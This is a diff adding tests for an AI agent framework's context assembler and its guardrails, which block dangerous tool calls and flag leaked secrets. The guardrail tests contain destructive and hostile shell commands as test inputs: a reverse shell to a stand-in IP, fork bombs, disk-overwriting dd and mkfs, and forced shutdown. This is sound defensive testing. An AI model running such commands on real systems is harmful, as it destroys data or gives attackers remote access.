@@ -138,6 +138,34 @@ describe('assembler — token 估算', () => {
     expect(estimateMessagesTokens([plain, withCall]))
       .toBe(estimateMessageTokens(plain) + estimateMessageTokens(withCall))
   })
+
+  it('中英混合校验：纯英文/纯中文估算与字符数成合理比例（sanity check）', () => {
+    // 纯英文：真实 tokenizer 约 3-5 字符 1 token；扣除消息开销后应落在 [len/8, len/2]。
+    const en = 'The quick brown fox jumps over the lazy dog and keeps running across the open yard.'
+    const enEst = estimateMessageTokens(msg('user', en)) - DEFAULT_TOKEN_PROFILE.messageOverhead
+    expect(enEst).toBeGreaterThanOrEqual(Math.floor(en.length / 8))
+    expect(enEst).toBeLessThanOrEqual(Math.ceil(en.length / 2))
+
+    // 纯中文：真实 tokenizer 约 0.6-2 token/字；估算应落在 [len/2, len*3]。
+    const zh = '今天天气不错我们打算去公园散步顺便再讨论一下项目的整体进度安排'
+    const zhEst = estimateMessageTokens(msg('user', zh)) - DEFAULT_TOKEN_PROFILE.messageOverhead
+    expect(zhEst).toBeGreaterThanOrEqual(Math.floor(zh.length / 2))
+    expect(zhEst).toBeLessThanOrEqual(zh.length * 3)
+  })
+
+  it('中英混合校验：混合消息估算与分段之和同量级，偏差在合理倍数内', () => {
+    const cnPart = '请把里面的安装步骤翻译成英文，并保持原有结构。'
+    const enPart = 'README.md and the markdown structure'
+    const mixed = cnPart.slice(0, -1) + ' ' + enPart + '。' // 拼成一句话，保留全部中英字符
+    const mixedEst = estimateMessageTokens(msg('user', mixed)) - DEFAULT_TOKEN_PROFILE.messageOverhead
+    const partSum = estimateTextTokens(cnPart) + estimateTextTokens(enPart)
+    // 与"分段估算之和"应在 0.5-2 倍内（混合文本只多了拼接处的空白）。
+    expect(mixedEst).toBeGreaterThanOrEqual(partSum * 0.5)
+    expect(mixedEst).toBeLessThanOrEqual(partSum * 2)
+    // 字符数 sanity：混合文本每字符估算应落在 0.25-2.5 token 之间。
+    expect(mixedEst).toBeGreaterThanOrEqual(mixed.length / 4)
+    expect(mixedEst).toBeLessThanOrEqual(mixed.length * 2.5)
+  })
 })
 
 describe('assembler — 预算分配', () => {
@@ -175,6 +203,22 @@ describe('assembler — 预算分配', () => {
     const low = a.allocate(10000, makeAnalysis({ risk: 'low' }), null)
     const high = a.allocate(10000, makeAnalysis({ risk: 'critical' }), null)
     expect(high.reserved).toBeGreaterThanOrEqual(low.reserved)
+  })
+
+  it('expert 复杂度 reserved 份额不低于 15%（防输出爆窗）', () => {
+    const expert = makeAnalysis({
+      complexity: { score: 95, level: 'expert', dimensions: { length: 90, domain: 90, steps: 95, risk: 80, context: 90 }, reasons: ['超大规模'] },
+    })
+    // 无论领域如何偏移，expert 下 reserved 都必须守住 15% 下限。
+    for (const domain of ['code', 'research', 'conversation', 'planning'] as TaskDomain[]) {
+      const alloc = a.allocate(10000, makeAnalysis({ ...expert, domain }), null)
+      expect(alloc.reserved).toBeGreaterThanOrEqual(10000 * 0.15)
+      // 加下限后五类之和仍恒等于 total。
+      expect(alloc.system + alloc.history + alloc.tools + alloc.plan + alloc.reserved).toBe(10000)
+    }
+    // 对照：moderate 复杂度不强制该下限（可以低于 15%）。
+    const moderate = a.allocate(10000, makeAnalysis(), null)
+    expect(moderate.reserved).toBeLessThan(10000 * 0.15)
   })
 
   it('total<=0 返回全 0，不抛错', () => {
@@ -264,6 +308,73 @@ describe('assembler — 历史裁剪', () => {
     const content = String(toolMsg!.content)
     expect(content).toContain('已折叠')
     expect(content.length).toBeLessThan(giant.length)
+    // 保守化：只保留首尾各 300 字符，头尾标记必须都完整保留。
+    expect(content.startsWith('HEAD_MARKER')).toBe(true)
+    expect(content.endsWith('TAIL_MARKER')).toBe(true)
+  })
+
+  it('折叠摘要带明确指引：已折叠 N 字符，完整内容可 read_file 原文件', () => {
+    const giant = 'A'.repeat(5000)
+    const msgs: LoopMessage[] = [
+      msg('system', 'sys'),
+      msg('user', '起点'),
+      msg('assistant', '', { tool_calls: [{ id: 't1', function: { name: 'read_file', arguments: '{"path":"/tmp/big.log"}' } }] }),
+      msg('tool', giant),
+    ]
+    const budget = a.allocate(2000, makeAnalysis(), null)
+    const trimmed = a.trim(msgs, budget)
+    const content = String(trimmed.find((m) => m.role === 'tool')!.content)
+    // 指引必须同时包含"折叠了多少"与"如何取回完整内容"。
+    expect(content).toContain('已折叠 4400 字符') // 5000 - 首尾各 300
+    expect(content).toContain('完整内容可 read_file 原文件')
+  })
+
+  it('含用户消息的轮权重最高：预算二选一时用户原话胜出', () => {
+    const msgs: LoopMessage[] = [
+      msg('system', 's'),
+      msg('user', '起点'),
+      msg('assistant', '助手第一轮的回答内容'),
+      msg('user', '用户第二轮的原话需要被保留下来'),
+      msg('assistant', '助手第二轮的回答同样也需要被完整保留下来'),
+      msg('user', '第三轮'),
+      msg('assistant', '回答三'),
+      msg('user', '第四轮'),
+      msg('assistant', '回答四'),
+    ]
+    const budget = a.allocate(180, makeAnalysis(), null)
+    const trimmed = a.trim(msgs, budget)
+    const texts = trimmed.map((m) => String(m.content))
+    // 预算只够二选一时，用户原话（USER_BASE_SCORE 最高）胜出，同位置的 assistant 正文被裁。
+    expect(texts).toContain('用户第二轮的原话需要被保留下来')
+    expect(texts).not.toContain('助手第二轮的回答同样也需要被完整保留下来')
+    // 首条 user（任务起点）仍然保留。
+    expect(texts).toContain('起点')
+  })
+
+  it('assistant 正文引用过工具结果时权重提升（裁掉会断裂上下文）', () => {
+    const result = '结果正常，输出完整，覆盖率为百分之八十七。'
+    const quoting = '结论：覆盖率为百分之八十七，整体符合预期。'
+    const plain = '结论：输出的各项指标均处于正常范围，整体符合预期。'
+    const msgs: LoopMessage[] = [
+      msg('system', 's'),
+      msg('user', '起点'),
+      msg('assistant', '', { tool_calls: [{ id: 't1', function: { name: 'shell', arguments: '{}' } }] }),
+      msg('tool', result),
+      msg('assistant', quoting),
+      msg('assistant', plain),
+      msg('user', '第二轮'),
+      msg('assistant', '回答二'),
+      msg('user', '第三轮'),
+      msg('assistant', '回答三'),
+    ]
+    const budget = a.allocate(300, makeAnalysis(), null)
+    const trimmed = a.trim(msgs, budget)
+    const texts = trimmed.map((m) => String(m.content))
+    // 引用了工具结果的正文被保留，未引用的同长度正文被裁掉。
+    expect(texts).toContain(quoting)
+    expect(texts).not.toContain(plain)
+    // 被引用的工具结果本体也应保留（引用与被引用者同在，上下文才不断裂）。
+    expect(texts).toContain(result)
   })
 
   it('含 error 的工具结果重要性更高（优先保留）', () => {
@@ -278,6 +389,19 @@ describe('assembler — 历史裁剪', () => {
     ]
     const trimmed = a.trim(withErr, budget)
     expect(trimmed.some((m) => m.role === 'tool' && String(m.content).includes('ERROR'))).toBe(true)
+  })
+
+  it('最近 2 轮的用户原话永不裁掉（预算紧张时轮内消息完整保留）', () => {
+    const msgs = longHistory(10)
+    const budget = a.allocate(700, makeAnalysis(), null)
+    const trimmed = a.trim(msgs, budget)
+    const texts = trimmed.map((m) => String(m.content))
+    // 第 8、9 轮的问题与回答全部保留（最近轮硬保护），中间轮次允许被裁。
+    for (const i of [8, 9]) {
+      expect(texts.some((t) => t.includes(`第 ${i} 轮问题`))).toBe(true)
+      expect(texts.some((t) => t.includes(`第 ${i} 轮回答`))).toBe(true)
+    }
+    expect(trimmed.length).toBeLessThan(msgs.length)
   })
 
   it('getTrimStats 返回可解释的裁剪统计', () => {
@@ -317,6 +441,29 @@ describe('assembler — 系统提示与一站式组装', () => {
   it('无计划时不产生计划段空标签', () => {
     const prompt = a.buildSystemPrompt(makeAnalysis(), null, makeDecision())
     expect(prompt).not.toContain('execution-plan')
+  })
+
+  it('buildSystemPrompt 四段顺序稳定：analysis → plan → strategy → guardrail', () => {
+    const prompt = a.buildSystemPrompt(makeAnalysis(), makePlan(['a', 'b'], [['a'], ['b']]), makeDecision())
+    const idx = ['task-analysis', 'execution-plan', 'execution-strategy', 'guardrails']
+      .map((t) => prompt.indexOf(`title="${t}"`))
+    expect(idx.every((i) => i >= 0)).toBe(true)
+    for (let i = 1; i < idx.length; i++) {
+      expect(idx[i]).toBeGreaterThan(idx[i - 1])
+    }
+  })
+
+  it('plan 为 null 或空计划时跳过计划段，且不留空段/连续空行', () => {
+    for (const plan of [null, makePlan([], [[]])]) {
+      const prompt = a.buildSystemPrompt(makeAnalysis(), plan, makeDecision())
+      const open = (prompt.match(/<system-reminder/g) || []).length
+      const close = (prompt.match(/<\/system-reminder>/g) || []).length
+      expect(open).toBe(3)
+      expect(close).toBe(3)
+      expect(prompt).not.toContain('execution-plan')
+      expect(prompt).not.toContain('title=""')
+      expect(prompt).not.toContain('\n\n\n') // 无空段残留的连续空行
+    }
   })
 
   it('高风险任务有额外护栏提示', () => {
@@ -425,6 +572,49 @@ describe('guardrails — 规则库与注册', () => {
     expect(r.allowed).toBe(true)
   })
 
+  it('addRule 重复 id 覆盖旧规则并返回被替换的那条；新增返回 null', () => {
+    const g = createGuardrails()
+    const first: GuardrailRule = {
+      id: 'test.dup', description: '旧版本', scope: 'tool', severity: 'warn',
+      test: (ctx) => ({ hit: (ctx.argsText || '').includes('MAGIC_OLD'), reason: '旧版本命中' }),
+    }
+    // 新增（无同 id 规则）返回 null。
+    expect(g.addRule(first)).toBeNull()
+    expect(g.checkTool('t', { x: 'MAGIC_OLD' }).reason).toContain('旧版本')
+    const second: GuardrailRule = {
+      id: 'test.dup', description: '新版本', scope: 'tool', severity: 'block',
+      test: (ctx) => ({ hit: (ctx.argsText || '').includes('MAGIC_NEW'), reason: '新版本命中' }),
+    }
+    // 重复 id：返回被替换的旧规则（对象同一性），且规则总数不变（覆盖而非追加）。
+    const replaced = g.addRule(second)
+    expect(replaced).not.toBeNull()
+    expect(replaced).toBe(first)
+    const countBefore = g.ruleCount
+    expect(g.addRule(second)).toBe(second)
+    expect(g.ruleCount).toBe(countBefore)
+    // 旧规则已失效、新规则生效。
+    expect(g.checkTool('t', { x: 'MAGIC_OLD' }).allowed).toBe(true)
+    expect(g.checkTool('t', { x: 'MAGIC_NEW' }).allowed).toBe(false)
+    expect(g.listRules().filter((r) => r.id === 'test.dup').length).toBe(1)
+    // 覆盖内置规则同样返回被替换的内置规则。
+    const builtinReplaced = g.addRule({
+      id: 'tool.shell_exec', description: '放行 shell', scope: 'tool', severity: 'warn', test: () => ({ hit: false }),
+    })
+    expect(builtinReplaced?.id).toBe('tool.shell_exec')
+    expect(builtinReplaced?.severity).toBe('block')
+  })
+
+  it('removeRule 对不存在的 id 返回 false 且不抛错', () => {
+    const g = createGuardrails()
+    expect(() => g.removeRule('no.such.rule')).not.toThrow()
+    expect(g.removeRule('no.such.rule')).toBe(false)
+    expect(g.removeRule('')).toBe(false)
+    // 二次移除：第一次成功，第二次返回 false。
+    g.addRule({ id: 'test.once', description: '一次性规则', scope: 'tool', severity: 'warn', test: () => ({ hit: false }) })
+    expect(g.removeRule('test.once')).toBe(true)
+    expect(g.removeRule('test.once')).toBe(false)
+  })
+
   it('listRules 导出规则清单', () => {
     const g = createGuardrails()
     const list = g.listRules()
@@ -479,6 +669,58 @@ describe('guardrails — checkTool 危险工具/参数', () => {
   it('反弹 shell block', () => {
     expect(g.checkTool('shell', { cmd: 'bash -i >& /dev/tcp/1.2.3.4/4444' }).severity).toBe('block')
   })
+
+  it('fork 炸弹 / 直写块设备 block', () => {
+    // 用中性工具名，确保 block 来自命令内容规则而非 tool.shell_exec。
+    // 经典 fork 炸弹（带空格与紧凑两种写法）。
+    expect(g.checkTool('terminal', { cmd: ':(){ :|:& };:' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: ':(){:|:&};:' }).severity).toBe('block')
+    // shell 重定向直写磁盘设备 / dd 写零覆盖磁盘。
+    expect(g.checkTool('terminal', { cmd: 'echo x > /dev/sda' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'cat /dev/urandom > /dev/nvme0n1' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'dd if=/dev/zero of=/dev/sda' }).severity).toBe('block')
+  })
+
+  it('mkfs 裸命令 / docker 全量清理 block，普通 docker prune 放行', () => {
+    expect(g.checkTool('terminal', { cmd: 'mkfs /dev/sda1' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'mkfs.ext4 /dev/sdb' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'docker system prune -af' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'docker system prune -a --volumes' }).severity).toBe('block')
+    // 不带 -a 的 prune 只清理已停止容器，属常规运维，放行。
+    expect(g.checkTool('terminal', { cmd: 'docker system prune -f' }).allowed).toBe(true)
+    expect(g.checkTool('terminal', { cmd: 'docker system prune -f' }).severity).toBeUndefined()
+  })
+
+  it('chown 递归 warn；chown root / 对根目录递归 block', () => {
+    const w = g.checkTool('terminal', { cmd: 'chown -R app:app ./dist' })
+    expect(w.severity).toBe('warn')
+    expect(w.allowed).toBe(true)
+    // 改属主为 root 属提权风险；对根目录递归 chown 会破坏系统权限。
+    expect(g.checkTool('terminal', { cmd: 'chown -R root ./app' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'chown root:root ./app' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'chown -R user /' }).severity).toBe('block')
+  })
+
+  it('npm publish / git push --force 主分支 warn 且放行', () => {
+    const np = g.checkTool('terminal', { cmd: 'npm publish --access public' })
+    expect(np.severity).toBe('warn')
+    expect(np.allowed).toBe(true)
+    expect(g.checkTool('terminal', { cmd: 'yarn publish' }).severity).toBe('warn')
+    expect(g.checkTool('git_operation', { cmd: 'git push --force origin main' }).severity).toBe('warn')
+    expect(g.checkTool('git_operation', { cmd: 'git push -f origin master' }).severity).toBe('warn')
+  })
+
+  it('shutdown/reboot 中英文 block；重启服务类命令放行', () => {
+    expect(g.checkTool('terminal', { cmd: 'shutdown -h now' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'reboot' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: 'poweroff' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: '立即重启计算机' }).severity).toBe('block')
+    expect(g.checkTool('terminal', { cmd: '立刻关机' }).severity).toBe('block')
+    // 重启单个服务是常规运维，不应误伤。
+    expect(g.checkTool('terminal', { cmd: 'systemctl restart nginx' }).allowed).toBe(true)
+    expect(g.checkTool('terminal', { cmd: 'systemctl restart nginx' }).severity).toBeUndefined()
+    expect(g.checkTool('terminal', { cmd: '重启 node 服务' }).allowed).toBe(true)
+  })
 })
 
 describe('guardrails — checkOutput 密钥/注入/超长', () => {
@@ -499,6 +741,34 @@ describe('guardrails — checkOutput 密钥/注入/超长', () => {
     expect(g.checkOutput('api_key: ' + 'x'.repeat(20)).severity).toBe('warn')
     expect(g.checkOutput('Authorization: Bearer ' + 'a'.repeat(30)).severity).toBe('warn')
     expect(g.checkOutput('password: ' + 'p'.repeat(10)).severity).toBe('warn')
+  })
+
+  it('密码误报排除：占位符/掩码/环境变量引用不告警，真实密码仍告警', () => {
+    // 尖括号占位模板与掩码串：不告警。
+    expect(g.checkOutput("password: '<占位符请替换>'").allowed).toBe(true)
+    expect(g.checkOutput("password: '******'").allowed).toBe(true)
+    expect(g.checkOutput('password: xxxxxx').allowed).toBe(true)
+    // 环境变量 / 配置引用：真实凭据不在文本里，不告警。
+    expect(g.checkOutput('password = process.env.DB_PASSWORD').allowed).toBe(true)
+    expect(g.checkOutput('password: config.auth.password').allowed).toBe(true)
+    // 字面占位词：不告警。
+    expect(g.checkOutput('password: changeme').allowed).toBe(true)
+    // 真实密码赋值：仍告警（英文与中文写法）。
+    expect(g.checkOutput('password: ' + 'p'.repeat(10)).severity).toBe('warn')
+    expect(g.checkOutput('"password": "real-secret-123"').severity).toBe('warn')
+    expect(g.checkOutput('密码：超级机密的密码123').severity).toBe('warn')
+  })
+
+  it('secret.jwt 阈值收紧：短段文本不误报，真实 JWT 仍告警', () => {
+    // 三段均为 10-12 字符的仿 JWT 文本：收紧后（每段 >=16）不再误报。
+    expect(g.checkOutput('eyj1234567890.abcdefghijklmn.opqrstuvwxyz').allowed).toBe(true)
+    // 真实 JWT（jwt.io 示例样式，各段远超 16 字符）：仍告警。
+    const jwt = [
+      'eyJ' + 'hbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
+      'eyJ' + 'zdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9',
+      'SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
+    ].join('.')
+    expect(g.checkOutput(jwt).severity).toBe('warn')
   })
 
   it('PII（身份证/手机号/邮箱）warn', () => {
@@ -568,6 +838,26 @@ describe('guardrails — checkLoop 循环检测', () => {
 
   it('调用数不足阈值放行', () => {
     expect(g.checkLoop([call('shell', '{}'), call('shell', '{}')]).allowed).toBe(true)
+  })
+
+  it('循环阈值可配置：getConfig 返回合并配置，更小阈值更早触发', () => {
+    const g2 = createGuardrails({ loopIdenticalThreshold: 2, loopToolFrequencyThreshold: 2 })
+    // getConfig 返回合并默认值后的配置，且为副本（改不动内部状态）。
+    expect(g2.getConfig().loopIdenticalThreshold).toBe(2)
+    expect(g2.getConfig().loopToolFrequencyThreshold).toBe(2)
+    g2.getConfig().loopIdenticalThreshold = 99
+    expect(g2.getConfig().loopIdenticalThreshold).toBe(2)
+    // 默认阈值 3：两次相同调用不告警；阈值调到 2 后立即告警。
+    const two = [call('shell', '{}'), call('shell', '{}')]
+    expect(createGuardrails().checkLoop(two).allowed).toBe(true)
+    const r = g2.checkLoop(two)
+    expect(r.severity).toBe('warn')
+    expect(r.reason).toContain('完全相同')
+    // 高频阈值 2：同工具不同参数也触发（连续相同规则不误报）。
+    const freq = [call('a', '{"p":1}'), call('a', '{"p":2}')]
+    const r2 = g2.checkLoop(freq)
+    expect(r2.severity).toBe('warn')
+    expect(r2.reason).toContain('高频')
   })
 })
 
